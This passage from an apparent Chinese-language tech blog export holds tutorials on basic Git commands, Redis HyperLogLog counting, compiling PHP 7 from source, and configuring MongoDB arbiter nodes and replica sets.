<p>  最后一步就是把**.gitignore**<strong>也提交到Git</strong>，就完成了！ 当然检验.gitignore的标准是git status命令是不是说working directory clean。 使用Windows的童鞋注意了，如果你在资源管理器里新建一个.gitignore文件，它会非常弱智地提示你必须输入文件名，但是在文本编辑器里“保存”或者“另存为”就可以把文件保存为.gitignore了。小结忽略某些文件时，需要编写.gitignore；.gitignore文件本身要放到版本库里，并且可以对.gitignore做版本管理！ <strong>配置别名</strong> 我们只需要敲一行命令，告诉Git，以后st就表示status：</p>
<p>$ git config –global alias.st status<br>$ git config –global alias.co checkout<br>$ git config –global alias.ci commit<br>$ git config –global alias.br branch</p>
<p>  以后提交就可以简写成：<code>$ git ci -m “bala bala bala…”</code> . <strong>–global</strong>参数是全局参数，也就是这些命令在这台电脑的所有Git仓库下都有用。 在撤销修改一节中，我们知道，命令<code>git reset HEAD file</code>可以把暂存区的修改撤销掉（unstage），重新放回工作区。既然是一个unstage操作，就可以配置一个unstage别名： <code>$ git config –global alias.unstage ‘reset HEAD’</code> 当你敲入命令：<code>$ git unstage test.py</code>实际上Git执行的是：<code>$ git reset HEAD test.py</code>配置一个git last，让其显示最后一次提交信息：**<code>$ git config –global alias.last ‘log -1′</code>** 这样，用git last就能显示最近一次的提交：</p>
<p>$ git last commit adca45d317e6d8a4b23f9811c3d7b7f0f180bfe2<br>Merge: bd6ae48 291bea8<br>Author: Michael Liao<br>Date:   Thu Aug 22 22:49:22 2013 +0800<br>merge &amp; fix hello.py</p>
<p> </p>
<p>甚至还有人丧心病狂地把lg配置成了：</p>
<p><strong>git config –global alias.lg “log –color –graph –pretty= format:’%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)&lt;%an&gt;%Creset’ –abbrev-commit”</strong> 配置文件配置Git的时候，加上–global是针对当前用户起作用的，电脑下所有库都起作用；如果不加，那只针对当前的仓库起作用。 <strong>配置文件放哪了？</strong> 每个仓库的Git配置文件都放在**.git/config**文件中：</p>
<p>$ cat .git/config<br>[core]    repository<br>formatversion = 0<br>filemode = true<br>bare = false<br>logallrefupdates = true<br>ignorecase = true<br>precomposeunicode = true[remote “origin”]<br>url = [<a href="mailto:&#x67;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#46;&#x63;&#111;&#109;">&#x67;&#x69;&#x74;&#64;&#103;&#105;&#x74;&#x68;&#x75;&#98;&#46;&#x63;&#111;&#109;</a>](mailto:<a href="mailto:&#x67;&#105;&#116;&#64;&#x67;&#x69;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;">&#x67;&#105;&#116;&#64;&#x67;&#x69;&#x74;&#104;&#x75;&#98;&#x2e;&#x63;&#111;&#x6d;</a>):michaelliao/learngit.git<br>fetch = +refs/heads/*:refs/remotes/origin/*[branch “master”]<br>remote = origin<br>merge = refs/heads/master<br>[alias]    last = log -1</p>
<p>  别名就在[alias]后面，要<strong>删除别名，直接把对应的行删掉</strong>即可。 而当前用户的Git配置文件放在<strong>用户主目录下</strong>的一个隐藏文件**.gitconfig<strong>中：</strong>Git的官方网站：<a href="http://git-scm.com,英文自我感觉不错的童鞋,可以经常去官网看看/">http://git-scm.com，英文自我感觉不错的童鞋，可以经常去官网看看</a>**</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>综合</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>git常用命令一</title>
    <url>/2017/02/08/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%B8%80/</url>
    <content><![CDATA[<h4 id="1-安装-Github"><a href="#1-安装-Github" class="headerlink" title="1.  安装 Github"></a>1.  安装 Github</h4><hr>
<p>查看是否安装git:</p>
<p>$ git<br>The program ‘git’ is currently not installed.<br>You can install it by typing: sudo apt-get install git</p>
<p>  安装git命令：<strong>sudo apt-get install git （cenos使用yum install）</strong>   安装完成后，还需要最后一步设置，在命令行输入：</p>
<p>$ git config –global user.name “Your Name”<br>$ git config –global user.email “[<a href="mailto:&#101;&#x6d;&#97;&#105;&#108;&#x40;&#x65;&#120;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;">&#101;&#x6d;&#97;&#105;&#108;&#x40;&#x65;&#120;&#x61;&#x6d;&#x70;&#x6c;&#101;&#46;&#99;&#x6f;&#x6d;</a>]“</p>
<p> </p>
<blockquote>
<p>因为Git是分布式版本控制系统，所以，每个机器都必须自报家门：你的名字和Email地址。你也许会担心，如果有人故意冒充别人怎么办？这个不必担心，首先我们相信大家都是善良无知的群众，其次，真的有冒充的也是有办法可查的。</p>
</blockquote>
<p>注意git config 命令的–global参数，用了这个参数，表示你这台机器上所有的Git仓库都会使用这个配置，当然也可以对某个仓库指定不同的用户名和Email地址。</p>
<h4 id="2-创建版本库"><a href="#2-创建版本库" class="headerlink" title="2.  创建版本库"></a>2.  创建版本库</h4><hr>
<p>创建一个版本库非常简单，首先，选择一个合适的地方，创建一个空目录：</p>
<p>$ mkdir learngit</p>
<p> </p>
<p>$ cd learngit<br>$git init<br>Initialized empty Git repository in /Users/michael/learngit/.git/</p>
<p>瞬间Git就把仓库建好了，而且告诉你是一个空的仓库（empty Git repository），细心的读者可以发现当前目录下多了一个.git的目录，这个目录是Git来跟踪管理版本库的，没事千万不要手动修改这个目录里面的文件，不然改乱了，就把Git仓库给破坏了。</p>
<h4 id="3-把文件添加到版本库"><a href="#3-把文件添加到版本库" class="headerlink" title="3.  把文件添加到版本库"></a>3.  把文件添加到版本库</h4><hr>
<p>首先这里再明确一下，所有的版本控制系统，其实只能跟踪文本文件的改动，比如TXT文件，网页，所有的程序代码等等，Git也不例外。 版本控制系统可以告诉你每次的改动，比如在第5行加了一个单词“Linux”，在第8行删了一个单词“Windows”。而图片、视频这些二进制文件，虽然也能由版本控制系统管理，但没法跟踪文件的变化，只能把二进制文件每次改动串起来，也就是只知道图片从100KB改成了120KB，但到底改了啥，版本控制系统不知道，也没法知道。 不幸的是，Microsoft的Word格式是二进制格式，因此，版本控制系统是没法跟踪Word文件的改动的，前面我们举的例子只是为了演示，如果要真正使用版本控制系统，就要以纯文本方式编写文件。 现在我们编写一个readme.txt文件，内容如下：</p>
<blockquote>
<p>Git is a version control system. Git is free software.</p>
</blockquote>
<p>一定要放到learngit目录下（子目录也行），因为这是一个Git仓库，放到其他地方Git再厉害也找不到这个文件。 把一个文件放到Git仓库只需要两步: <strong>第一步</strong>，用命令<strong>git add</strong>告诉Git，把文件添加到仓库：</p>
<p>$ git  add  readme.txt</p>
<p>  执行上面的命令，没有任何显示，这就对了，Unix的哲学是“没有消息就是好消息”，说明添加成功。 <strong>第二步</strong>，用命令<strong>git commit</strong>告诉Git，把文件提交到仓库：</p>
<p>$  git  commit -m  “wrote a readme file”<br>[master (root-commit) cb926e7] wrote a readme file 1 file changed, 2 insertions(+)<br>create mode 100644 readme.txt</p>
<p>  简单解释一下<strong>git commit</strong>命令: <strong>-m</strong>后面输入的是本次提交的说明，可以输入任意内容，当然最好是有意义的，这样你就能从历史记录里方便地找到改动记录。 <strong>git commit</strong>命令执行成功后会告诉你，1个文件被改动（我们新添加的readme.txt文件），插入了两行内容（readme.txt有两行内容）。 为什么Git添加文件需要add，commit一共两步呢？ 因为commit可以一次提交很多文件，所以你可以多次add不同的文件，比如：</p>
<p>$ git add file1.txt<br>$ git add file2.txt file3.txt<br>$ git commit -m “add 3 files.”</p>
<p>  <strong>git status</strong> 命令可以让我们时刻掌握仓库当前的状态，上面的命令告诉我们，readme.txt被修改过了，但还没有准备提交的修改。</p>
<p>$ git status<br>#On branch master<br># Changes not staged for commit:     ———-add之前，变化还没进入暂存区；<br>#   (use “git add …” to update what will be committed)<br>#   (use “git checkout – …” to discard changes in working directory)<br>#       modified:   readme.txt  —此文件被修改<br>#<br># Untracked files:  —–此文件是新的，以前从未被提交过；<br>#   (use “git add …” to include in what will be committed)<br>#       LICENSE</p>
<p>  虽然Git告诉我们readme.txt被修改了，但如果能看看具体修改了什么内容，自然是很好的。 比如你休假两周从国外回来，第一天上班时，已经记不清上次怎么修改的readme.txt，所以，需要用<strong>git diff</strong>这个命令看看。 <strong>git diff</strong>顾名思义就是查看difference，显示的格式正是Unix通用的diff格式。</p>
<p>$  git diff readme.txt<br>diff –git a/readme.txt b/readme.txt<br>index 46d49bf..9247db6 100644 — a/readme.txt +++ b/readme.txt<br> @@ -1,2 +1,2 @@ -Git is a version control system. –这一句没了<br>+Git is a distributed version control system. — 这一句是新加的 Git is free software. –这一句是原来就有的</p>
<p>  先把大量文件一次性add进来：*<em>git add <em>.py</em></em>，然后你用<strong>git status</strong>查看，会有提示：</p>
<p>$git status<br>Changes to be committed:<br>(use “git reset HEAD …” to unstage)<br>    new file:   1.py<br>    new file:   2.py<br>    new file:   3.py<br>    new file:   4.py</p>
<p>  要排除掉其中一个文件，用:<strong>git reset HEAD 1.py</strong> 这时再用<code>git status</code>看，1.py变成了<strong>untracked</strong>，剩下的就可以提交了。</p>
<h4 id="4，版本回退"><a href="#4，版本回退" class="headerlink" title="4，版本回退"></a>4，版本回退</h4><hr>
<p><em>在实际工作中，我们脑子里怎么可能记得一个几千行的文件每次都改了什么内容，不然要版本控制系统干什么。</em> 版本控制系统肯定有某个命令可以告诉我们历史记录，在Git中，我们用<strong>git log</strong>命令查看； git log命令显示从最近到最远的提交日志，我们可以看到3次提交，最近的一次是append GPL，上一次是add distributed，最早的一次是wrote a readme file。 首先，Git必须知道当前版本是哪个版本，在Git中，用HEAD表示当前版本，也就是最新的提交3628164…882e1e0（注意:我的提交ID和你的肯不一在Git中），上一个版本就是HEAD^，上上一个版本就是HEAD^^，当然往上100个版本写100个^比较容易数不过来，所以写成HEAD~100。 现在，我们要把当前版本“append GPL”回退到上一个版本“add distributed”，就可以使用git reset 命令：</p>
<p>$ **git re****set–hard HEAD^**<br>HEAD is now at ea34578 add distributed</p>
<p>  <code>$ cat readme.txt</code> 查看当前版本下，文件的内容；</p>
<blockquote>
<p>Git is a distributed version control system. Git is free software.</p>
</blockquote>
<p>然我们用<strong>git log</strong>再看看现在版本库的状态：最新的那个版本append GPL已经看不到了； 想再回去已经回不去了，肿么办？办法其实还是有的，只要上面的命令行窗口还没有被关掉，你就可以顺着往上找啊找啊，找到那个append GPL的commit id是3628164…，于是就可以指定回到未来的某个版本：</p>
<p>$ git re set –hard 3628164**<br>HEAD is now at 3628164 append GPL</p>
<p>  版本号没必要写全，前几位就可以了，Git会自动去找。当然也不能只写前一两位，因为Git可能会找到多个版本号，就无法确定是哪一个了。 在Git中，总是有后悔药可以吃的。当你用<code>$ git reset --hard HEAD^</code> 回退到<code>add distributed</code>版本时，再想恢复到<code>append GPL</code>，就必须找到<code>append GPL</code>的<strong>commit id</strong>。Git提供了一个命令git reflog用来记录你的每一次命令：$ <strong>git reflog</strong></p>
<p>$ **git reflog**<br>ea34578 HEAD@{0}: reset: moving to HEAD^3628164<br>HEAD@{1}: commit: append GPLea34578<br>HEAD@{2}: commit: add distributedcb926e7<br>HEAD@{3}: commit (initial): wrote a readme file</p>
<p> </p>
<h4 id="5-工作区和暂存区"><a href="#5-工作区和暂存区" class="headerlink" title="5.  工作区和暂存区"></a>5.  工作区和暂存区</h4><hr>
<blockquote>
<p>Git和其他版本控制系统如SVN的一个不同之处就是有暂存区的概念。</p>
</blockquote>
<p>先来看名词解释: <strong>工作区（Working Directory）</strong>就是你在电脑里能看到的目录，比如我的syzgit文件夹就是一个工作区. <strong>版本库（Repository）</strong>工作区有一个隐藏目录.git，这个不算工作区，而是Git的版本库。 Git的版本库里存了很多东西，其中最重要的就是称为<strong>stage（或者叫index）的暂存区</strong>，还有Git为我们自动创建的<strong>第一个分支master</strong>，以及指向master的一个指针叫<strong>HEAD</strong>。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/220694-211fe3d4378c607d?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p>
<p>git-repo</p>
<p>分支和HEAD的概念我们以后再讲。前面讲了我们把文件往Git版本库里添加的时候，是分两步执行的： <strong>第一步</strong>是用<strong>git add</strong> –&gt; 把文件添加进去，实际上就是把文件修改添加到暂存区 <strong>第二步</strong>是用<strong>git commit</strong> –&gt; 提交更改，实际上就是把暂存区的所有内容提交到当前分支。 因为我们创建Git版本库时，Git自动为我们创建了唯一一个master分支，所以，现在，<strong>git commit</strong>就是往<strong>master</strong>分支上提交更改。你可以简单理解为，需要提交的文件修改通通放到暂存区，然后，一次性提交暂存区的所有修改。</p>
<h4 id="6，管理修改，撤销修改，删除文件"><a href="#6，管理修改，撤销修改，删除文件" class="headerlink" title="6，管理修改，撤销修改，删除文件"></a>6，管理修改，撤销修改，删除文件</h4><hr>
<blockquote>
<p>为什么Git比其他版本控制系统设计得优秀，因为<strong>Git跟踪并管理的是修改，而非文件</strong>。</p>
</blockquote>
<p>你会问，什么是修改？ <em>比如你新增了一行，这就是一个修改，删除了一行，也是一个修改，更改了某些字符，也是一个修改，删了一些又加了一些，也是一个修改，甚至创建一个新文件，也算一个修改。</em> <strong>Git管理的是修改</strong>，当你用<strong>git add</strong>命令后，在工作区的第一次修改被放入暂存区，准备提交，但是文件又被修改一次，在工作区的第二次修改并没有放入暂存区，所以此时直接用<strong>git commit</strong>只负责把暂存区的修改提交了，也就是第一次的修改被提交了，第二次的修改不会被提交。 那怎么提交第二次修改呢？你可以继续<strong>git add</strong>再<strong>git commit</strong>，也可以别着急提交第一次修改，先<strong>git add</strong>第二次修改，再<strong>git commit</strong>，就相当于把两次修改合并后一块提交了：</p>
<blockquote>
<p>第一次修改 -&gt; git add-&gt; 第二次修改 -&gt; git add -&gt; git commit</p>
</blockquote>
<p>$ git status<br># On branch master<br># Changes not staged for commit: — add之前<br>#   (use “git add …” to update what will be committed)<br>#   (use “git checkout – …” to discard changes in working directory)<br># #       modified:   readme.txt</p>
<p>  Git会告诉你，<strong>git checkout – file</strong> 可以丢弃工作区的修改：</p>
<blockquote>
<p><strong>$ git checkout</strong> – <strong>readme.txt 撤销工作区的修改 回到 暂存区/库版本</strong></p>
</blockquote>
<p>命令<strong>git checkout – readme.txt</strong>意思就是，把readme.txt文件在<strong>工作区的修改全部撤销</strong>，</p>
<blockquote>
<p>这里有两种情况： 一种是readme.txt自修改后还没有被放到暂存区，现在，撤销修改就回到和版本库一模一样的状态； 一种是readme.txt已经添加到暂存区后，又作了修改，现在，撤销修改就回到添加到暂存区后的状态。</p>
</blockquote>
<p>总之，就是让这个文件<strong>回到最近一次git commit或git add时的状态</strong>。 <strong>git checkout – file</strong>命令中的**–<strong>很重要，没有–，就变成了“创建一个新分支”的命令，我们在后面的分支管理中会再次遇到</strong>git checkout<strong>命令。 Git同样告诉我们，用命令</strong>git reset HEAD file<strong>，</strong>撤销暂存区的修改掉（unstage），重新放回工作区** <strong>git reset</strong>命令既可以回退版本，也可以把暂存区的修改回退到工作区。当我们用HEAD时表示最新的版本。</p>
<blockquote>
<p>场景1：当你改乱了工作区某个文件的内容，想直接丢弃工作区的修改时，用命令git checkout – file。 场景2：当你不但改乱了工作区某个文件的内容，还添加到了暂存区时，想丢弃修改，分两步，第一步用命令git reset HEAD file，就回到了场景1，第二步按场景1操作。 场景3：已经提交了不合适的修改到版本库时，想要撤销本次提交，参考<a href="http://www.liaoxuefeng.com/wiki/0013739516305929606dd18361248578c67b8067c8c017b000/0013744142037508cf42e51debf49668810645e02887691000">版本回退</a>一节，不过前提是没有推送到远程库。</p>
</blockquote>
<p>Git知道你删除了文件，因此，工作区和版本库就不一致了，<strong>git status</strong> 命令会立刻告诉你哪些文件被删除了：</p>
<p>$ git status<br># On branch master<br># Changes not staged for commit:<br>#   (use “git add/rm …” to update what will be committed)<br>#   (use “git checkout – …” to discard changes in working directory)<br>#     deleted:    test.txt#no changes added to commit (use “git add” and/or “git commit -a”)</p>
<p>  现在你有两个选择，一是确实要从版本库中删除该文件，那就用命令git rm 删掉，并且<strong>git commit</strong>：</p>
<p>$ git rm test.txt<br>$ git commit -m “remove test.txt”<br>[master d17efd8] remove test.txt 1 file changed, 1 deletion(-) delete mode 100644 test.txt</p>
<p>  现在，文件就从版本库中被删除了。</p>
<blockquote>
<p>另一种情况是删错了，因为版本库里还有呢，所以可以很轻松地把误删的文件恢复到最新版本： $ <strong>git checkout – test.txt</strong> git checkout其实是用版本库里的版本替换工作区的版本，无论工作区是修改还是删除，都可以“一键还原”。 命令<strong>git rm</strong>用于删除一个文件。如果一个文件已经被提交到版本库，那么你永远不用担心误删，但是要小心，你只能恢复文件到最新版本，你会丢失**最近一次提交后你修改的内容。</p>
</blockquote>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>综合</category>
      </categories>
      <tags>
        <tag>git</tag>
      </tags>
  </entry>
  <entry>
    <title>Redis之HyperLogLog</title>
    <url>/2017/01/24/redis%E4%B9%8Bhyperloglog/</url>
    <content><![CDATA[<blockquote>
<p>HyperLogLog，数据统计去重处理的神器之一，应用内存管理，实时计算，快速统计网站独立ip，uv等等。</p>
</blockquote>
<p>redis HyperLogLog 是用来做基数统计的算法，HyperLogLog 的优点是，在输入元素的数量或者体积非常非常大时，计算基数所需的空间总是固定 的、并且是很小的。 在 Redis 里面，每个 HyperLogLog 键只需要花费 12 KB 内存，就可以计算接近 2^64 个不同元素的基 数。这和计算基数时，元素越多耗费内存就越多的集合形成鲜明对比。 但是，因为 HyperLogLog 只会根据输入元素来计算基数，而不会储存输入元素本身，所以 HyperLogLog 不能像集合那样，返回输入的各个元素。</p>
<h2 id="什么是基数"><a href="#什么是基数" class="headerlink" title="什么是基数?"></a>什么是基数?</h2><p>比如数据集 {1, 3, 5, 7, 5, 7, 8}， 那么这个数据集的基数集为 {1, 3, 5 ,7, 8}, 基数(不重复元素)为5。 基数估计就是在误差可接受的范围内，快速计算基数。  </p>
<p>接下来举个栗子。。。</p>
<p>我们把每日IP记录下来，假设每天有一亿个IP访问，如果使用集合的话，一天的内存使用就是1.5G，假设我们存储一个月的记录，就需要45G容量。但是使用HyperLogLog的话，一天12K，一个月360K。如果我们不需要知道IP具体信息的话，完全可以把这些记录留在内存一年、或者不删都行。如果需要，我们也会把所有的IP访问记录通过其他途径存储起来。把每天的信息存储起来，我们可以计算每月IP总数（MERGE），一年的IP总数等（去重）。  </p>
<h3 id="最后具体操作方法"><a href="#最后具体操作方法" class="headerlink" title="最后具体操作方法"></a>最后具体操作方法</h3><p><strong>1)将元素添加至 HyperLogLog</strong><br>PFADD key element [element …] 将任意数量的元素添加到指定的 HyperLogLog 里面。 这个命令可能会对 HyperLogLog 进行修改，以便反映新的基数估算值，如果 HyperLogLog 的基数估算 值在命令执行之后出现了变化， 那么命令返回 1 ， 否则返回 0 。 命令的复杂度为 O(N) ，N 为被添加元素的数量。 返回给定 HyperLogLog 的基数估算值 PFCOUNT key [key …] 当只给定一个 HyperLogLog 时，命令返回给定 HyperLogLog 的基数估算值。 当给定多个 HyperLogLog 时，命令会先对给定的 HyperLogLog 进行并集计算，得出一个合并后的 HyperLogLog ，然后返回这个合并 HyperLogLog 的基数估算值作为命令的结果（合并得出的 HyperLogLog 不会被储存，使用之后就会被删掉）。 当命令作用于单个 HyperLogLog 时， 复杂度为 O(1) ， 并且具有非常低的平均常数时间。 当命令作用于多个 HyperLogLog 时， 复杂度为 O(N) ，并且常数时间也比处理单个 HyperLogLog 时要 大得多。  </p>
<p><strong>2)PFADD 和 PFCOUNT 的使用示例</strong><br><code>redis&gt; PFADD unique::ip::counter &#39;192.168.0.1&#39;</code><br><code>(integer) 1</code><br><code>redis&gt; PFADD unique::ip::counter &#39;127.0.0.1&#39;</code><br><code>(integer) 1</code><br><code>redis&gt; PFADD unique::ip::counter &#39;255.255.255.255&#39;</code><br><code>(integer) 1</code> <code>redis&gt; PFCOUNT unique::ip::counter</code><br><code>(integer) 3</code></p>
<p><strong>3)合并多个 HyperLogLog</strong><br> PFMERGE destkey sourcekey [sourcekey …] 将多个 HyperLogLog 合并为一个 HyperLogLog ，合并后的 HyperLogLog 的基数估算值是通过对所有 给定 HyperLogLog 进行并集计算得出的。 命令的复杂度为 O(N) ， 其中 N 为被合并的 HyperLogLog 数量， 不过这个命令的常数复杂度比较高。 PFMERGE 的使用示例<br> <code>redis&gt; PFADD str1 &quot;apple&quot; &quot;banana&quot; &quot;cherry&quot;</code> <code>(integer) 1</code><br>  <code>redis&gt; PFCOUNT str1</code> <code>(integer) 3</code><br>  <code>redis&gt; PFADD str2 &quot;apple&quot; &quot;cherry&quot; &quot;durian&quot; &quot;mongo&quot;</code> <code>(integer) 1</code><br>  <code>redis&gt; PFCOUNT str2</code> <code>(integer) 4</code> <code>redis&gt; PFMERGE str1&amp;2 str1 str2</code><br>  <code>OK</code><br>  <code>redis&gt; PFCOUNT str1&amp;2</code> <code>(integer) 5</code></p>
]]></content>
      <categories>
        <category>数据库</category>
        <category>综合</category>
        <category>Redis</category>
      </categories>
      <tags>
        <tag>大数据</tag>
        <tag>Redis</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP7的安装以及注意点</title>
    <url>/2017/01/23/php7%E7%9A%84%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E6%B3%A8%E6%84%8F%E7%82%B9/</url>
    <content><![CDATA[<p>一、首先下载 进入PHP官网：<a href="http://php.net/downloads.php">http://php.net/downloads.php</a>，寻找最新稳定版本   下载你选择的版本</p>
<p>cd ~<br>wget <a href="http://cn2.php.net/get/php-7.1.1.tar.gz/from/this/mirror">http://cn2.php.net/get/php-7.1.1.tar.gz/from/this/mirror</a></p>
<p>  二、安装</p>
<p>tar –zxvf php-7.1.1.tar.gz<br>cd php-7.1.1</p>
<p>  为了不影响原有php版本，编译指定目录到/usr/local/php7 下，如下并且带上所需的php扩展</p>
<p>./configure –prefix=/usr/local/php7 –with-config-file-path=/usr/local/php7/etc –with-mcrypt=/usr/include –with-mysql=mysqlnd –with-mysqli=mysqlnd –with-pdo-mysql=mysqlnd<br>–with-gd –with-iconv –with-zlib –enable-xml –enable-bcmath –enable-shmop –enable-sysvsem –enable-inline-optimization –enable-mbregex –enable-fpm –enable-mbstring –enable-ftp<br>–enable-gd-native-ttf –with-openssl –enable-pcntl –enable-sockets –with-xmlrpc –enable-zip –enable-soap –without-pear –with-gettext –enable-session –with-curl –with-jpeg-dir<br>–with-freetype-dir –enable-opcache</p>
<p>  然后开始编译安装，中间时间可能会比较长</p>
<p>make<br>#注：如果出现make: *** [sapi/cli/php] error 1<br>#则继续执行下面语句，如果没有则不用<br>make ZEND_EXTRA_LIBS=’-liconv’<br>make install</p>
<p>  如果一切顺利，应该就已经安装完毕 另外由于需要一些配置，复制一些配置文件</p>
<p>cp php.ini-production /usr/local/php7/etc/php.ini<br>cp /usr/local/php7/etc/php-fpm.conf.default /usr/local/php7/etc/php-fpm.conf<br>cp /usr/local/php7/etc/php-fpm.d/<a href="http://www.conf.default/">www.conf.default</a> /usr/local/php7/etc/php-fpm.d/<a href="http://www.conf/">www.conf</a></p>
<p>  为了避免出现端口冲突，需要找到listen，修改监听的端口号为9001（或其他没有被占用的端口号）</p>
<p>vim /usr/local/php7/etc/php-fpm.d/<a href="http://www.conf/">www.conf</a><br>–&gt;listen = 127.0.0.1:9001</p>
<p>  为了方便操作，进行一些最后的配置</p>
<p>cp /etc/init.d/php-fpm /etc/init.d/php7</p>
<p>  编辑修改：</p>
<p>vim /etc/init.d/php7</p>
<p>  找到</p>
<p>prefix=/usr/local/php</p>
<p>  改为</p>
<p>prefix=/usr/local/php7</p>
<p>  然后就可以使用service命令了</p>
<p>service php7 restart</p>
<p>  最后的最后,追求更加便捷^^（其实就是懒）</p>
<p>cp /usr/local/php7/bin/php /usr/bin/php7</p>
<p>  因为属于新安装的PHP程序，所以很多旧版本的扩展都不一定支持PHP7，例如phpredis就需要去社区下载专门的PHP7版本的扩展，当然万能的github上会有更多版本 还有一点要注意就是mongodb的扩展，php7已经废弃了原来的mongo扩展，目前只支持mongdb的扩展，个人感觉是很繁琐的，有时间会出个文章介绍下。 同样的代码，放到PHP7里面大概提高近一倍的效率，尤其是针对文件操作方面。 php7的性能绝对可以double，trust me！！！</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP7</tag>
      </tags>
  </entry>
  <entry>
    <title>MongDB之仲裁节点</title>
    <url>/2017/01/23/mongdb%E4%B9%8B%E4%BB%B2%E8%A3%81%E8%8A%82%E7%82%B9/</url>
    <content><![CDATA[<p>之前搭建mongo副本集时，好多地方提到了仲裁节点的概念，说的云里雾里，后来去我大知乎看下找到了满意的答案</p>
<p>&gt; <strong><a href="https://www.zhihu.com/question/27648448">https://www.zhihu.com/question/27648448</a></strong></p>
<p>总结俩点就是</p>
<p>1. 为什么使用奇数个数成员？ 假设一种场景，偶数8节点，IDC网络故障发生分裂，,这两个分裂后的IDC各持有4个节点，因为投票数未超过半数，所以无法选举出新Primary。 2. 仲裁节点作用？ 仲裁节点并不需要太多系统资源，也并不持有数据本身，而是参与投票。 投票选举机制，根据数据最后操作、更新时间戳等判定，若有两方都为最新，且票数相等，此环节需要等待若干分钟。 仲裁节点打破这个僵局</p>
<p>总之就是集群切换时方便选出Primary节点</p>
<p>下面来说下仲裁节点的设置</p>
<p>仲裁节点不持有数据，所以可以在集群节点中的一台再加个端口多开一台，但是目录要配置不同</p>
<p>如下</p>
<p> mongod.conf</p>
<blockquote>
<p>dbpath=/data/mongodb/db/ logpath=/data/mongodb/log/mongodb.log pidfilepath=/usr/local/mongodb/run/mongodb.pid #bind_ip=172.21.1.60 fork=true directoryperdb=true logappend=true replSet=dcclog port=27017 #oplogSize=10000 noprealloc=true</p>
</blockquote>
<p> mongd_1.conf</p>
<blockquote>
<p>dbpath=/data/mongodb_1/db/ #path logpath=/data/mongodb_1/log/mongodb.log #loh pidfilepath=/usr/local/mongodb/run_1/mongodb.pid #pid #bind_ip=172.21.1.60 fork=true directoryperdb=true logappend=true replSet=dcclog #bind_ip=10.10.148.132 port=27018#端口更换 oplogSize=10000 noprealloc=true</p>
<p>arbiterOnly = true #仲裁</p>
</blockquote>
<p>然后启动时执行</p>
<blockquote>
<p>/usr/local/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod.conf</p>
</blockquote>
<blockquote>
<p>/usr/local/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod_1.conf</p>
</blockquote>
]]></content>
      <categories>
        <category>MongoDB</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
      </tags>
  </entry>
  <entry>
    <title>MongoDB搭建副本集</title>
    <url>/2017/01/23/mongodb%E6%90%AD%E5%BB%BA%E5%89%AF%E6%9C%AC%E9%9B%86/</url>
    <content><![CDATA[<h1 id="MongoDB-复制（副本集）"><a href="#MongoDB-复制（副本集）" class="headerlink" title="MongoDB 复制（副本集）"></a>MongoDB 复制（副本集）</h1><p>MongoDB复制是将数据同步在多个服务器的过程。 复制提供了数据的冗余备份，并在多个服务器上存储数据副本，提高了数据的可用性， 并可以保证数据的安全性。 复制还允许您从硬件故障和服务中断中恢复数据。</p>
<h2 id="什么是复制"><a href="#什么是复制" class="headerlink" title="什么是复制?"></a>什么是复制?</h2><ul>
<li>保障数据的安全性</li>
<li>数据高可用性 (24*7)</li>
<li>灾难恢复</li>
<li>无需停机维护（如备份，重建索引，压缩）</li>
<li>分布式读取数据</li>
</ul>
<hr>
<h2 id="MongoDB复制原理"><a href="#MongoDB复制原理" class="headerlink" title="MongoDB复制原理"></a>MongoDB复制原理</h2><p>mongodb的复制至少需要两个节点。其中一个是主节点，负责处理客户端请求，其余的都是从节点，负责复制主节点上的数据。 mongodb各个节点常见的搭配方式为：一主一从、一主多从。 主节点记录在其上的所有操作oplog，从节点定期轮询主节点获取这些操作，然后对自己的数据副本执行这些操作，从而保证从节点的数据与主节点一致。 MongoDB复制结构图如下所示： <img src="http://www.runoob.com/wp-content/uploads/2013/12/replication.png" alt="MongoDB复制结构图"> 以上结构图总，客户端总主节点读取数据，在客户端写入数据到主节点是， 主节点与从节点进行数据交互保障数据的一致性。</p>
<h3 id="副本集特征："><a href="#副本集特征：" class="headerlink" title="副本集特征："></a>副本集特征：</h3><ul>
<li>N 个节点的集群</li>
<li>任何节点可作为主节点</li>
<li>所有写入操作都在主节点上</li>
<li>自动故障转移</li>
<li>自动恢复</li>
</ul>
<p>  <strong>副本集配置文件搭建</strong> [plain] view plaincopy #arbiter.conf dbpath=/mongodb/data/arbiter logpath=/mongodb/log/arbiter.log pidfilepath=/mongodb/arbiter.pid directoryperdb=true logappend=true replSet=testrs #bind_ip=192.168.56.14 port=27017 oplogSize=10000 fork=true noprealloc=true 参数解释： dbpath：数据存放目录 logpath：日志存放路径 pidfilepath：进程文件，方便停止mongodb directoryperdb：为每一个数据库按照数据库名建立文件夹存放 logappend：以追加的方式记录日志 replSet：replica set的名字 bind_ip：mongodb所绑定的ip地址 port：mongodb进程所使用的端口号，默认为27017 oplogSize：mongodb操作日志文件的最大大小。单位为Mb，默认为硬盘剩余空间的5% fork：以后台方式运行进程 noprealloc：不预先分配存储   <strong>接下来找到对应的启动配置及服务应用</strong> /usr/local/mongodb/bin/mongod -f /usr/local/mongodb/etc/mongod.conf 最好启动奇数台机器，如果为偶数台机器，请参考<a href="http://onwise.xyz/?p=104">仲裁节点</a> 然后进入其中一台机器 <img src="http://qiniu.fengmumiao.com/1.png"> 添加启动ip及对应的端口 然后执行</p>
<blockquote>
<p>rs.status()</p>
</blockquote>
<p>查看状态 <strong>遇见报错</strong> 启动不成功，查看日志文件</p>
<blockquote>
<p>tail -f /data/mongodb/log/mongdb.log</p>
